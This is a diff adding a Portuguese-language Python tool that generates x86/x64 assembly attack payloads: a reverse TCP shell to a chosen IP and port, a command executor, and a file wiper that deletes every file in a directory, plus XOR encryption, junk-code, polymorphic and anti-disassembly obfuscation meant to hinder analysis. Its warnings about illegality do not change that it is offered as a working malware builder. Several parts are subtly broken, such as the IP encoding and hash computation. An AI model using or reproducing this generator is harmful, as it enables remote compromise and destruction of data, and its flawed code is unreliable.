@@ -1,1 +1,684 @@
+#!/data/data/com.termux/files/usr/bin/python3
+# -*- coding: utf-8 -*-
 
+import os
+import sys
+import time
+import random
+import base64
+import hashlib
+from typing import Dict, List, Optional
+
+# Interface colorida
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.prompt import Prompt, Confirm, IntPrompt
+from rich.progress import Progress
+from rich.syntax import Syntax
+
+console = Console()
+
+class GeradorPayloadsAssembly:
+    def __init__(self):
+        self.payloads = {
+            'shell_reverse_tcp': {
+                'function': self.gerar_shell_reverse_tcp,
+                'arch': 'x86',
+                'danger_level': 'high',
+                'description': 'Reverse Shell TCP em Assembly'
+            },
+            'exec_cmd': {
+                'function': self.gerar_exec_cmd,
+                'arch': 'x64',
+                'danger_level': 'medium',
+                'description': 'Executar comandos do sistema'
+            },
+            'file_wiper': {
+                'function': self.gerar_file_wiper,
+                'arch': 'x86',
+                'danger_level': 'critical',
+                'description': 'Apagar arquivos do sistema'
+            }
+        }
+        
+        self.tecnicas_ofuscacao = {
+            'encrypt': 'Criptografia XOR',
+            'junk': 'Inserção de código lixo',
+            'polymorphic': 'Código polimórfico',
+            'anti_disasm': 'Técnicas anti-desmontagem'
+        }
+        
+        self.banners = [
+            self._gerar_banner_asm_elite(),
+            self._gerar_banner_asm_dark(),
+            self._gerar_banner_asm_hell()
+        ]
+        
+        self._verificar_dependencias()
+    
+    def _gerar_banner_asm_elite(self) -> str:
+        return """
+[bold blue]
+  ▄████  █    ██  ██▓     ██▓ ███▄ ▄███▓ ▄▄▄       ███▄ ▄███▓ █    ██ 
+ ██▒ ▀█▒ ██  ▓██▒▓██▒    ▓██▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▀█▀ ██▒ ██  ▓██▒
+▒██░▄▄▄░▓██  ▒██░▒██░    ▒██▒▓██    ▓██░▒██  ▀█▄  ▓██    ▓██░▓██  ▒██░
+░▓█  ██▓▓▓█  ░██░▒██░    ░██░▒██    ▒██ ░██▄▄▄▄██ ▒██    ▒██ ▓▓█  ░██░
+░▒▓███▀▒▒▒█████▓ ░██████▒░██░▒██▒   ░██▒ ▓█   ▓██▒▒██▒   ░██▒▒▒█████▓ 
+ ░▒   ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░▒▓▒ ▒ ▒ 
+  ░   ░ ░░▒░ ░ ░ ░ ░ ▒  ░ ▒ ░░  ░      ░  ▒   ▒▒ ░░  ░      ░░░▒░ ░ ░ 
+░ ░   ░  ░░░ ░ ░   ░ ░    ▒ ░░      ░     ░   ▒   ░      ░    ░░░ ░ ░ 
+      ░    ░         ░  ░ ░         ░         ░  ░       ░      ░     
+[/bold blue]
+[bold white on blue]        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+        █  GERADOR DE PAYLOADS ASSEMBLY v9.0 - ELITE CODING  █
+        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█[/bold white on blue]
+"""
+    
+    def _gerar_banner_asm_dark(self) -> str:
+        return """
+[bold red]
+        ████████████████████████████████████████████████████████
+        █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
+        █░░░░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░█
+        █░░░░░░░░░░▄▀▀▀░░░░░░░░▄▄▄██▀▀▀▀▀▀▀▀▀▀█████▄░░░░░░░░░█
+        █░░░░░░░░▄▀░░░░░░░░░░░▄▀▀░░▀▀▀▀▄▄▄▄▄░░░░░▀▀█▄░░░░░░░░█
+        █░░░░░░░█░░░░░░░░░░░░░█░░░░░░░░░░░░▀▀▄▄▄░░░░█░░░░░░░░█
+        █░░░░░░▐▌░░░░░░░░░░░░░▐▌░░░░░░░░░░░░░░░░▀▀▄▄▀░░░░░░░░█
+        █░░░░░░█░░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░▀▄░░░░░░░░█
+        █░░░░░▐▌░░░░░░░░░░░░░░░▐▌░░░░░░░░░░░░░░░░░░░░░█░░░░░░░█
+        █░░░░░█░░░█▀▄▄▄▄▄▄▄▄▄▄█░░░░░░░░░░░░░░░░░░░░░░▐▌░░░░░░█
+        █░░░░▐▌░░░█▒▒▒▒▒▒▒▒▒▒▒█░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄░░░█░░░░░░█
+        █░░░░█░░░░█▒▒▒▒▒▒▒▒▒▒▒█░░░░░░▄▀▒▒▒▒▒▒▒▒▒▒▒▒▀▄░░░░░░░█
+        █░░░▐▌░░░░▀▄▒▒▒▒▒▒▒▒▒▒█░░░░░▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒█░░░░░░█
+        █░░░█░░░░░░░▀▄▄▄▄▄▄▄▄▀░░░░░▐▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▌░░░░░█
+        █░░▐▌░░░░░░░░░░░░░░░░░░░░░░░█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█░░░░░░█
+        █░░█░░░░░░░░░░░░░░░░░░░░░░░░▐▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▌░░░░░█
+        █░▐▌░░░░░░░░░░░░░░░░░░░░░░░░░█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█░░░░░░█
+        █░█░░░░░░░░░░░░░░░░░░░░░░░░░░▐▌▄▄▄▄▄▄▄▄▄▄▄▄▄▀░░░░░█
+        █▐▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
+        ██▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
+[/bold red]
+[bold white on red]        GERADOR DE PAYLOADS ASSEMBLY - DARK MODE EDITION[/bold white on red]
+"""
+    
+    def _gerar_banner_asm_hell(self) -> str:
+        return """
+[bold yellow]
+        ╔══════════════════════════════════════════════════════╗
+        ║                                                      ║
+        ║   ██╗  ██╗ █████╗  ██████╗ ██╗  ██╗███████╗██████╗  ║
+        ║   ██║  ██║██╔══██╗██╔════╝ ██║  ██║██╔════╝██╔══██╗ ║
+        ║   ███████║███████║██║  ███╗███████║█████╗  ██████╔╝ ║
+        ║   ██╔══██║██╔══██║██║   ██║██╔══██║██╔══╝  ██╔══██╗ ║
+        ║   ██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗██║  ██║ ║
+        ║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ║
+        ║                                                      ║
+        ║   ██████╗  █████╗ ██╗   ██╗██╗      █████╗ ███████╗ ║
+        ║   ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔══██╗██╔════╝ ║
+        ║   ██████╔╝███████║ ╚████╔╝ ██║     ███████║███████╗ ║
+        ║   ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██╔══██║╚════██║ ║
+        ║   ██║     ██║  ██║   ██║   ███████╗██║  ██║███████║ ║
+        ║   ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ║
+        ║                                                      ║
+        ╚══════════════════════════════════════════════════════╝
+[/bold yellow]
+[bold black on yellow]        GERADOR DE PAYLOADS EM ASSEMBLY - HELLFIRE EDITION[/bold black on yellow]
+"""
+    
+    def _verificar_dependencias(self):
+        try:
+            from rich import print
+        except ImportError:
+            console.print("[red]Erro: Biblioteca 'rich' não encontrada[/red]")
+            if Confirm.ask("Instalar automaticamente?"):
+                os.system("pip install rich")
+    
+    def mostrar_banner(self):
+        console.print(random.choice(self.banners))
+        console.print(Panel.fit(
+            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL PODE RESULTAR EM PRISÃO! ⚠️[/blink bold red]",
+            style="red on black"
+        ))
+        time.sleep(1)
+    
+    def mostrar_menu_principal(self):
+        while True:
+            console.clear()
+            self.mostrar_banner()
+            
+            tabela = Table(
+                title="[bold cyan]🔧 MENU PRINCIPAL (ASSEMBLY)[/bold cyan]",
+                show_header=True,
+                header_style="bold magenta"
+            )
+            tabela.add_column("Opção", style="cyan", width=10)
+            tabela.add_column("Payload", style="green")
+            tabela.add_column("Arquitetura", style="yellow")
+            tabela.add_column("Perigo", style="red")
+            
+            for i, (nome, dados) in enumerate(self.payloads.items(), 1):
+                perigo = {
+                    'high': '🔥 ALTO',
+                    'medium': '⚠️ MÉDIO',
+                    'critical': '💀 CRÍTICO'
+                }.get(dados['danger_level'], '')
+                tabela.add_row(
+                    str(i),
+                    nome,
+                    dados['arch'],
+                    perigo,
+                    dados['description']
+                )
+            
+            tabela.add_row("0", "Técnicas", "", "Opções de ofuscação")
+            tabela.add_row("9", "Sair", "", "Encerrar o programa")
+            
+            console.print(tabela)
+            
+            escolha = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione",
+                choices=[str(i) for i in range(0, len(self.payloads)+1)] + ['9'],
+                show_choices=False
+            )
+            
+            if escolha == "1":
+                self._processar_payload('shell_reverse_tcp')
+            elif escolha == "2":
+                self._processar_payload('exec_cmd')
+            elif escolha == "3":
+                self._processar_payload('file_wiper')
+            elif escolha == "0":
+                self._mostrar_menu_tecnicas()
+            elif escolha == "9":
+                self._sair()
+    
+    def _mostrar_menu_tecnicas(self):
+        while True:
+            console.clear()
+            console.print(Panel.fit(
+                "[bold cyan]⚙️ TÉCNICAS DE OFUSCAÇÃO (ASSEMBLY)[/bold cyan]",
+                border_style="cyan"
+            ))
+            
+            tabela = Table(show_header=True, header_style="bold blue")
+            tabela.add_column("ID", style="cyan", width=5)
+            tabela.add_column("Técnica", style="green")
+            tabela.add_column("Descrição")
+            
+            for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
+                tabela.add_row(str(i), desc, self._descricao_tecnica(codigo))
+            
+            console.print(tabela)
+            
+            escolha = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione (0 para voltar)",
+                choices=[str(i) for i in range(0, len(self.tecnicas_ofuscacao)+1)],
+                show_choices=False
+            )
+            
+            if escolha == "0":
+                return
+    
+    def _descricao_tecnica(self, codigo: str) -> str:
+        descricoes = {
+            'encrypt': "Criptografa o payload com XOR simples",
+            'junk': "Insere instruções aleatórias inúteis",
+            'polymorphic': "Gera código que muda a cada compilação",
+            'anti_disasm': "Adiciona truques para confundir desmontadores"
+        }
+        return descricoes.get(codigo, "Sem descrição disponível")
+    
+    def _processar_payload(self, nome_payload: str):
+        payload_data = self.payloads[nome_payload]
+        
+        if payload_data['danger_level'] in ['high', 'critical']:
+            console.print(Panel.fit(
+                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
+                "Este payload pode causar danos permanentes ou violar leis.\n"
+                "Use apenas em ambientes controlados e com autorização!",
+                border_style="red"
+            ))
+            
+            if not Confirm.ask("Confirmar criação?", default=False):
+                return
+        
+        config = self._configurar_payload(nome_payload)
+        if config is None:
+            return
+        
+        ofuscar = Confirm.ask("Aplicar técnicas de ofuscação?")
+        tecnicas = []
+        if ofuscar:
+            tecnicas = self._selecionar_tecnicas_ofuscacao()
+        
+        with Progress() as progress:
+            task = progress.add_task("[red]Gerando código Assembly...[/red]", total=100)
+            
+            payload = payload_data['function'](**config)
+            progress.update(task, advance=40)
+            
+            if ofuscar:
+                for tecnica in tecnicas:
+                    payload = self._ofuscar_codigo_asm(payload, tecnica)
+                    progress.update(task, advance=20)
+            
+            progress.update(task, completed=100)
+        
+        self._preview_payload(payload)
+        self._salvar_payload(nome_payload, payload, payload_data['arch'])
+    
+    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
+        config = {}
+        
+        if nome_payload == 'shell_reverse_tcp':
+            console.print(Panel.fit(
+                "[bold]Configuração Reverse Shell[/bold]",
+                border_style="blue"
+            ))
+            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
+            config['port'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
+        
+        elif nome_payload == 'exec_cmd':
+            console.print(Panel.fit(
+                "[bold]Configuração Execução de Comandos[/bold]",
+                border_style="blue"
+            ))
+            config['cmd'] = Prompt.ask(
+                "[yellow]?[/yellow] Comando para executar",
+                default="id; uname -a"
+            )
+        
+        elif nome_payload == 'file_wiper':
+            console.print(Panel.fit(
+                "[bold red]Configuração File Wiper[/bold red]",
+                border_style="red"
+            ))
+            config['path'] = Prompt.ask(
+                "[yellow]?[/yellow] Caminho para apagar",
+                default="/tmp/"
+            )
+        
+        console.print("\n[bold]Resumo:[/bold]")
+        for chave, valor in config.items():
+            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
+        
+        if not Confirm.ask("Confirmar configurações?"):
+            return None
+        
+        return config
+    
+    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
+        console.print("\n[bold]Técnicas de Ofuscação:[/bold]")
+        tabela = Table(show_header=True, header_style="bold magenta")
+        tabela.add_column("ID", style="cyan", width=5)
+        tabela.add_column("Técnica", style="green")
+        
+        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
+            tabela.add_row(str(i), desc)
+        
+        console.print(tabela)
+        
+        escolhas = Prompt.ask(
+            "[yellow]?[/yellow] Selecione as técnicas (separadas por vírgula)",
+            default="1,3"
+        )
+        
+        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
+    
+    def _preview_payload(self, payload: str):
+        console.print(Panel.fit(
+            "[bold]PRÉ-VISUALIZAÇÃO DO CÓDIGO ASSEMBLY[/bold]",
+            border_style="yellow"
+        ))
+        
+        lines = payload.split('\n')[:30]
+        code = '\n'.join(lines)
+        
+        console.print(Syntax(code, "nasm", theme="monokai", line_numbers=True))
+        
+        if len(payload.split('\n')) > 30:
+            console.print("[yellow]... (truncado, mostrando apenas as primeiras 30 linhas)[/yellow]")
+    
+    def _salvar_payload(self, nome_payload: str, payload: str, arch: str):
+        nome_arquivo = Prompt.ask(
+            "[yellow]?[/yellow] Nome do arquivo Assembly",
+            default=f"payload_{nome_payload}.asm"
+        )
+        
+        try:
+            with open(nome_arquivo, 'w', encoding='utf-8') as f:
+                f.write(payload)
+            
+            with open(nome_arquivo, 'rb') as f:
+                md5 = hashlib.md5(f.read()).hexdigest()
+                sha256 = hashlib.sha256(f.read()).hexdigest()
+            
+            compile_cmd = f"nasm -f {'elf32' if arch == 'x86' else 'elf64'} {nome_arquivo} -o {nome_arquivo[:-4]}.o"
+            link_cmd = f"ld -m {'elf_i386' if arch == 'x86' else 'elf_x86_64'} {nome_arquivo[:-4]}.o -o {nome_arquivo[:-4]}"
+            
+            console.print(Panel.fit(
+                f"[green]✓ Arquivo salvo como [bold]{nome_arquivo}[/bold][/green]\n"
+                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
+                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n\n"
+                f"[yellow]Para compilar (Linux):[/yellow]\n"
+                f"[white]{compile_cmd}[/white]\n"
+                f"[white]{link_cmd}[/white]",
+                title="[bold green]SUCESSO[/bold green]",
+                border_style="green"
+            ))
+            
+        except Exception as e:
+            console.print(Panel.fit(
+                f"[red]✗ Erro: {str(e)}[/red]",
+                title="[bold red]ERRO[/bold red]",
+                border_style="red"
+            ))
+        
+        input("\nPressione Enter para continuar...")
+    
+    def _ofuscar_codigo_asm(self, payload: str, tecnica: str) -> str:
+        if tecnica == 'encrypt':
+            return self._ofuscar_com_criptografia_asm(payload)
+        elif tecnica == 'junk':
+            return self._adicionar_codigo_lixo_asm(payload)
+        elif tecnica == 'polymorphic':
+            return self._ofuscar_polimorfico_asm(payload)
+        elif tecnica == 'anti_disasm':
+            return self._adicionar_anti_desmontagem_asm(payload)
+        return payload
+    
+    def _ofuscar_com_criptografia_asm(self, payload: str) -> str:
+        key = random.randint(1, 255)
+        encrypted = f"; Encrypted with XOR key 0x{key:02x}\n"
+        
+        lines = payload.split('\n')
+        for line in lines:
+            if line.strip() and not line.strip().startswith(';'):
+                encrypted += f"; {line}\n"
+                enc_line = []
+                for c in line:
+                    enc_line.append(ord(c) ^ key)
+                encrypted += f"db {','.join(f'0x{x:02x}' for x in enc_line)}\n"
+            else:
+                encrypted += line + '\n'
+        
+        decryption_stub = f"""
+section .text
+global _start
+_start:
+    jmp real_start
+    decrypt_key db 0x{key:02x}
+
+real_start:
+    mov esi, encrypted_code
+    mov edi, esi
+    mov ecx, (encrypted_end - encrypted_code)
+    mov al, [decrypt_key]
+decrypt_loop:
+    xor [esi], al
+    inc esi
+    loop decrypt_loop
+    jmp encrypted_code
+
+encrypted_code:
+"""
+        return decryption_stub + encrypted + "\nencrypted_end:\n"
+    
+    def _adicionar_codigo_lixo_asm(self, payload: str) -> str:
+        junk_instructions = [
+            "nop",
+            "mov eax, eax",
+            "push eax\npop eax",
+            "xchg ebx, ebx",
+            "add esp, 0\nsub esp, 0",
+            "db 0x90, 0x90, 0x90"
+        ]
+        
+        lines = payload.split('\n')
+        for i in range(len(lines)-1, 0, -1):
+            if random.random() > 0.7 and lines[i].strip() and not lines[i].strip().startswith(';'):
+                lines.insert(i, f"; Junk code\n    {random.choice(junk_instructions)}")
+        
+        return '\n'.join(lines)
+    
+    def _ofuscar_polimorfico_asm(self, payload: str) -> str:
+        # Substitui instruções por equivalentes
+        replacements = {
+            "mov eax, ebx": ["xchg eax, ebx\n    xchg eax, ebx", "push ebx\n    pop eax"],
+            "add eax, 1": ["inc eax", "sub eax, -1"],
+            "sub eax, 1": ["dec eax", "add eax, -1"],
+            "xor eax, eax": ["sub eax, eax", "mov eax, 0"]
+        }
+        
+        for old, news in replacements.items():
+            for new in news:
+                if old in payload:
+                    payload = payload.replace(old, random.choice(news))
+                    break
+        
+        return payload
+    
+    def _adicionar_anti_desmontagem_asm(self, payload: str) -> str:
+        anti_code = """
+    ; Anti-disassembly tricks
+    db 0xE8
+    call $+5
+    pop eax
+    add eax, 9
+    push eax
+    ret
+    db 0xE8
+    jmp real_code
+
+real_code:
+"""
+        return anti_code + payload
+    
+    # Implementações dos payloads em Assembly
+    def gerar_shell_reverse_tcp(self, ip: str, port: int, **kwargs) -> str:
+        ip_parts = ip.split('.')
+        ip_bytes = [str(int(part)) for part in ip_parts]
+        port_hex = f"0x{port:04x}"
+        
+        return f"""; Reverse TCP Shell (x86)
+; Connects to {ip}:{port}
+; nasm -f elf32 shell.asm -o shell.o
+; ld -m elf_i386 shell.o -o shell
+
+section .text
+global _start
+_start:
+    ; Create socket
+    xor eax, eax
+    mov al, 0x66     ; socketcall
+    xor ebx, ebx
+    mov bl, 0x1      ; SYS_SOCKET
+    xor ecx, ecx
+    push ecx         ; protocol = 0
+    push ebx         ; SOCK_STREAM
+    push 0x2         ; AF_INET
+    mov ecx, esp     ; args
+    int 0x80
+    mov edi, eax     ; save socket fd
+
+    ; Connect to server
+    mov al, 0x66     ; socketcall
+    mov bl, 0x3      ; SYS_CONNECT
+    push dword 0x{ip_bytes[3]}{ip_bytes[2]}{ip_bytes[1]}{ip_bytes[0]} ; IP address
+    push word {port_hex}  ; Port
+    push word 0x2     ; AF_INET
+    mov ecx, esp     ; sockaddr struct
+    push 0x10        ; addrlen
+    push ecx         ; sockaddr
+    push edi         ; sockfd
+    mov ecx, esp     ; args
+    int 0x80
+
+    ; Redirect STDIN, STDOUT, STDERR
+    xor ecx, ecx
+    mov cl, 0x3      ; counter for 3 fds
+dup_loop:
+    dec ecx
+    mov al, 0x3f     ; dup2
+    mov ebx, edi     ; sockfd
+    int 0x80
+    jnz dup_loop
+
+    ; Execute shell
+    xor eax, eax
+    push eax         ; NULL terminator
+    push 0x68732f2f  ; "hs//"
+    push 0x6e69622f  ; "nib/"
+    mov ebx, esp     ; "/bin//sh"
+    push eax         ; NULL
+    mov edx, esp     ; envp
+    push ebx         ; argv
+    mov ecx, esp     ; args
+    mov al, 0xb      ; execve
+    int 0x80"""
+    
+    def gerar_exec_cmd(self, cmd: str, **kwargs) -> str:
+        cmd_bytes = ', '.join(f"0x{ord(c):02x}" for c in cmd)
+        return f"""; Execute Command (x64)
+; Runs: {cmd}
+; nasm -f elf64 exec.asm -o exec.o
+; ld exec.o -o exec
+
+section .text
+global _start
+_start:
+    xor rdx, rdx        ; envp = NULL
+    push rdx            ; NULL terminator
+    
+    ; Push command string
+    mov rbx, 0x{ord(cmd[-1]):02x}{ord(cmd[-2]):02x}{ord(cmd[-3]):02x}{ord(cmd[-4]):02x} ; Last 4 chars
+    push rbx
+    mov rbx, 0x{ord(cmd[-5]):02x}{ord(cmd[-6]):02x}{ord(cmd[-7]):02x}{ord(cmd[-8]):02x} ; Next 4 chars
+    push rbx
+    ; ... add more pushes if command is longer
+    
+    mov rdi, rsp        ; cmd string
+    push rdx            ; argv[1] = NULL
+    push rdi            ; argv[0] = cmd
+    mov rsi, rsp        ; argv
+    
+    ; Execute
+    xor rax, rax
+    mov al, 0x3b        ; execve
+    syscall
+    
+    ; Exit
+    xor rdi, rdi
+    mov al, 0x3c        ; exit
+    syscall"""
+    
+    def gerar_file_wiper(self, path: str, **kwargs) -> str:
+        return f"""; File Wiper (x86)
+; Deletes files in: {path}
+; nasm -f elf32 wiper.asm -o wiper.o
+; ld -m elf_i386 wiper.o -o wiper
+
+section .text
+global _start
+_start:
+    ; Open directory
+    mov eax, 5          ; open
+    mov ebx, path       ; path
+    mov ecx, 0          ; O_RDONLY
+    int 0x80
+    mov ebp, eax        ; save fd
+
+readdir:
+    ; Read directory entry
+    mov eax, 89         ; getdents
+    mov ebx, ebp        ; fd
+    mov ecx, buffer     ; buffer
+    mov edx, 1024       ; buffer size
+    int 0x80
+    test eax, eax       ; check bytes read
+    jz exit             ; if 0, done
+    
+    ; Process entries
+    mov esi, buffer
+    add esi, 10         ; skip to d_name
+
+process_entry:
+    cmp byte [esi], 0   ; end of entries?
+    je readdir
+    
+    ; Skip . and ..
+    cmp byte [esi], '.'
+    je next_entry
+    
+    ; Build full path
+    mov edi, fullpath
+    mov ecx, path
+    mov edx, ecx
+copy_path:
+    mov al, [ecx]
+    mov [edi], al
+    inc ecx
+    inc edi
+    test al, al
+    jnz copy_path
+    
+    dec edi
+    mov byte [edi], '/'
+    inc edi
+    
+copy_name:
+    mov al, [esi]
+    mov [edi], al
+    inc esi
+    inc edi
+    test al, al
+    jnz copy_name
+    
+    ; Delete file
+    mov eax, 10         ; unlink
+    mov ebx, fullpath
+    int 0x80
+
+next_entry:
+    add esi, 256        ; next entry
+    jmp process_entry
+
+exit:
+    ; Close directory
+    mov eax, 6          ; close
+    mov ebx, ebp
+    int 0x80
+    
+    ; Exit
+    mov eax, 1
+    xor ebx, ebx
+    int 0x80
+
+section .data
+path: db "{path}",0
+buffer: times 1024 db 0
+fullpath: times 1024 db 0"""
+    
+    def _sair(self):
+        console.print(Panel.fit(
+            "[blink bold red]⚠️ ATENÇÃO: CRIAÇÃO DE MALWARE É CRIME EM MUITOS PAÍSES! ⚠️[/blink bold red]",
+            border_style="red"
+        ))
+        console.print("[cyan]Saindo...[/cyan]")
+        time.sleep(1)
+        sys.exit(0)
+
+def main():
+    try:
+        gerador = GeradorPayloadsAssembly()
+        gerador.mostrar_menu_principal()
+    except KeyboardInterrupt:
+        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
+        sys.exit(0)
+    except Exception as e:
+        console.print(f"\n[red]✗ Erro fatal: {str(e)}[/red]")
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
